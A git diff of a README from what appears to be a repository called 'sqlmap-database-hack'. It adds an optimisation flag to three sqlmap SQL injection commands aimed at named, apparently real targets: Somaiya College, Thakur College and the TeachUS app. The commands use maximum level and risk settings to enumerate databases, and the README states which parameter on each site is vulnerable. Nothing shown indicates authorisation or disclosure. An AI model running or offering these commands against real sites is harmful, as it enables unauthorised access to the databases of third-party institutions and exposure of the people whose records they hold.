@@ -31,7 +31,7 @@ git clone https://github.com/seanvishwakarma/sqlmap-database-hack.git
 The SQL injection vulnerability was found in the `id` parameter.
 
 ```bash
-sqlmap -r somaiyaClg.txt -p id --batch --level 5 --risk 3 --dbs
+sqlmap -r somaiyaClg.txt -p id --batch -o --level 5 --risk 3 --dbs
 ```
 ![Somaiya College SQLMap Result](images/somaiyaClg.png)
 
@@ -40,7 +40,7 @@ sqlmap -r somaiyaClg.txt -p id --batch --level 5 --risk 3 --dbs
 For Thakur College, the vulnerability was found in the `password` parameter.
 
 ```bash
-sqlmap -r thakur.txt -p password --batch --level 5 --risk 3 --time-sec=5 --dbs
+sqlmap -r thakur.txt -p password --batch -o --level 5 --risk 3 --time-sec=5 --dbs
 ```
 ![Thakur College SQLMap Result](images/thakur.png)
 
@@ -50,6 +50,6 @@ sqlmap -r thakur.txt -p password --batch --level 5 --risk 3 --time-sec=5 --dbs
 The TeachUS app database was vulnerable through the college parameter.
 
 ```bash
-sqlmap -r teachus.txt -p college --batch --level 5 --risk 3 --dbs
+sqlmap -r teachus.txt -p college --batch -o --level 5 --risk 3 --dbs
 ```
 ![TeachUS App SQLMap Result](images/teachus.png)
